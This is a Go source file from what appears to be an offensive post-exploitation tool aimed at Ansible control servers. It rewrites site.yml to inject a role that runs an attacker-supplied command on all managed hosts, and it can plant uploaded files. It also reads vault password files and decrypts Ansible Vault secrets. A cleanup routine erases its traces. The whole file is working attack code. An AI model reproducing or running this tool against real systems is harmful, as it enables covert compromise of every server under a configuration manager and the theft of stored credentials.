package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"

	"github.com/fatih/color"
	"github.com/gobuffalo/packr/v2"
	"github.com/l50/goutils"
	"github.com/l50/mose/pkg/moseutils"
)

type Command struct {
	CmdName  string
	Cmd      string
	FileName string
	FilePath string
}

type Metadata struct {
	PayloadName string
}

var (
	a                = CreateAgent()
	bdCmd            = a.BdCmd
	errmsg           = color.Red
	localIP          = a.LocalIP
	msg              = color.Green
	osTarget         = a.OsTarget
	ansibleRole      = a.PayloadName
	uploadFileName   = a.FileName
	serveSSL         = a.SSL
	exfilPort        = a.ExPort
	suppliedFilename string
	keys             []string
	inspect          bool
	uploadFilePath   = a.FilePath
	cleanup          bool
	cleanupFile      = a.CleanupFile
	ansibleBackupLoc = a.AnsibleBackupLoc
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
}

func findAnsibleConfig() []string {
	//quick check to see if easy win for Ansible Configuration folder
	var configLocs []string
	ansibleEnv := os.Getenv("ANSIBLE_CONFIG")
	if ansibleEnv != "" {
		//store this as a potential area to search. still continue with other locations
		configLocs = append(configLocs, ansibleEnv)
	}
	fileList, _ := moseutils.GetFileAndDirList([]string{"/root", "/etc/ansible", "/home"})

	for _, file := range fileList {
		if strings.Contains(file, "ansible.cfg") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			configLocs = append(configLocs, file)
		}
	}

	if len(configLocs) == 0 {
		log.Fatalln("Unable to find configuration file on system, exiting.")
	}

	return configLocs
}

func backdoorSite(siteLoc string) {
	yesRoles := regexp.MustCompile(`(?sm)(hosts: all.*?roles:)`)
	noRoles := regexp.MustCompile(`(?sm)(hosts: all.*?)^-`)
	comments := regexp.MustCompile(`#.*`)

	fileContent, err := ioutil.ReadFile(siteLoc)
	if err != nil {
		log.Println(err)
		log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
	}

	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))

	// Check if roles found first
	found := yesRoles.MatchString(content)
	if found {
		matches := yesRoles.FindStringSubmatch(content)
		insertString := matches[1] + "\n    - " + ansibleRole + "\n"
		content = fmt.Sprint(yesRoles.ReplaceAllString(content, insertString))
		err = ioutil.WriteFile(siteLoc, []byte(content), 0644)
		if err != nil {
			log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
		}

		return

	}

	// Check if non roles section found
	found = noRoles.MatchString(content)
	if found {
		matches := noRoles.FindStringSubmatch(content)
		insertString := string(matches[1]) + "\n  roles:\n    - " + ansibleRole + "\n\n-"
		content = fmt.Sprint(noRoles.ReplaceAllString(content, insertString))
		err = ioutil.WriteFile(siteLoc, []byte(content), 0644)
		if err != nil {
			log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
		}

		return
	}

	log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
}

func getSiteLoc(siteLoc string) string {
	d, _ := filepath.Split(siteLoc)
	return d
}

func createRole(siteLoc string, ansibleRole string, cmd string) {
	sitePathLoc := getSiteLoc(siteLoc)
	roleLoc := filepath.Join(sitePathLoc, "roles", ansibleRole)
	roleFolders := []string{filepath.Join(roleLoc, "tasks")}
	mainyml := filepath.Join(roleLoc, "tasks", "main.yml")
	if moseutils.CreateFolders(roleFolders) && generatePlaybook(mainyml, cmd) {
		msg("Successfully created the %s role at %s", ansibleRole, mainyml)
		msg("Adding folder %s to cleanup file", roleFolders)
		// Track the folders for clean up purposes
		moseutils.TrackChanges(cleanupFile, roleLoc)
		if uploadFileName != "" {
			ansibleFiles := filepath.Join(roleLoc, "files")

			moseutils.CreateFolders([]string{ansibleFiles})
			log.Printf("Copying  %s to module location %s", uploadFileName, ansibleFiles)
			moseutils.CpFile(uploadFileName, filepath.Join(ansibleFiles, filepath.Base(uploadFileName)))
			if err := os.Chmod(filepath.Join(ansibleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal(err)
			}
			log.Printf("Successfully copied and chmod file %s", filepath.Join(ansibleFiles, filepath.Base(uploadFileName)))
		}
	} else {
		log.Fatalf("Failed to create %s role", ansibleRole)
	}
}

func generatePlaybook(playbookLoc string, cmd string) bool {
	ansibleCommand := Command{
		CmdName:  "cmd",
		Cmd:      bdCmd,
		FileName: uploadFileName,
		FilePath: uploadFilePath,
	}

	box := packr.New("Puppet", "../../../templates/ansible")

	s, err := box.FindString("ansiblePlaybook.tmpl")
	if uploadFileName != "" {
		s, err = box.FindString("ansibleFileUploadPlaybook.tmpl")
	}

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("ansiblePlaybook").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(playbookLoc)

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, ansibleCommand)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	return true
}

func getAnsibleSecrets(siteLoc string, ansibleCfgs []string) {
	found, ansibleVault := moseutils.FindBin("ansible-vault", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
	if !found {
		log.Printf("Ansible Vault not found, no need to find secrets")
		return
	}

	var vaultPasswords []string
	for _, cfg := range ansibleCfgs {
		reg := regexp.MustCompile(`(?ms)vault_password_file\s*?=\s*?(.*?)\n`)
		matches := moseutils.GrepFile(cfg, reg)
		if len(matches) > 0 {
			for _, match := range matches {
				submatch := reg.FindStringSubmatch(match)
				if len(submatch) > 0 {
					vaultPasswords = append(vaultPasswords, submatch[1])
				}
			}
		}
	}

	var morePasswords []string
	for _, pass := range vaultPasswords {
		if strings.Contains(pass, "~") {
			fileList, _ := moseutils.FindFiles([]string{"/home"}, []string{}, []string{filepath.Base(pass)}, []string{})
			morePasswords = append(morePasswords, fileList...)
		}
	}
	if len(morePasswords) > 0 {
		vaultPasswords = append(vaultPasswords, morePasswords...)
	}
	log.Printf("%v", vaultPasswords)

	sitePathLoc := getSiteLoc(siteLoc)
	fileList, _ := moseutils.FindFiles([]string{sitePathLoc}, []string{".yml"}, []string{"vault"}, []string{})

	if len(fileList) == 0 {
		log.Println("Unable to find any yml files, skipping...")
		return
	}

	for _, k := range fileList {
		reg := regexp.MustCompile(`(?ms)VAULT`)
		matches := moseutils.GrepFile(k, reg)
		if len(matches) > 0 {
			if len(vaultPasswords) > 0 {
				for _, pass := range vaultPasswords {
					res, err := utils.RunCommand(ansibleVault, "--vault-password-file", pass, "view", k)
					if err != nil {
						log.Printf("Error running command: %s --vault-password-file %s view %s %v", ansibleVault, pass, k, err)
						continue
					}
					msg("%s", res)
				}
			} else {
				res, err := utils.RunCommand(ansibleVault, "view", k)
				if err != nil {
					log.Printf("Error running command: %s view %s %v", ansibleVault, k, err)
					continue
				}
				msg("%s", res)
			}
		}

	}

	return
}

func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
	if err != nil {
		log.Fatal("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if ansibleBackupLoc != "" {
		path = filepath.Join(ansibleBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !moseutils.FileExists(path) {
		log.Printf("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal("Quitting...")
		}
	}
	if ans || ans2 {
		moseutils.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

func backupSite(siteLoc string) {
	path := siteLoc
	if ansibleBackupLoc != "" {
		path = filepath.Join(ansibleBackupLoc, filepath.Base(siteLoc))
	}
	if !moseutils.FileExists(path + ".bak.mose") {
		moseutils.CpFile(siteLoc, path+".bak.mose")
		return
	}
	log.Printf("Backup of the site.yml (%v.bak.mose) already exists.", siteLoc)
	return
}

func main() {
	// parse args
	flag.Parse()

	// gonna assume not root then we screwed
	utils.CheckRoot()
	ansibleCfgs := findAnsibleConfig()

	if uploadFilePath != "" {
		moseutils.TrackChanges(cleanupFile, uploadFilePath)
	}

	found, _ := moseutils.FindBin("ansible", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
	if !found {
		log.Fatalf("ansible binary not found, exiting...")
	}
	found, siteLoc := moseutils.FindBin("site.yml", []string{"/etc/ansible", "/home", "/opt", "/root", "/var"})
	if !found {
		log.Fatalf("site.yml not found, exiting...")
	}

	if cleanup {
		doCleanup(siteLoc)
	}

	backupSite(siteLoc)
	msg("Backdooring the %s site.yml to run %s on all ansible roles, please wait...", siteLoc, bdCmd)
	backdoorSite(siteLoc)
	createRole(siteLoc, ansibleRole, bdCmd)

	log.Println("Attempting to find secrets stored with Ansible-Vault")
	getAnsibleSecrets(siteLoc, ansibleCfgs)
}
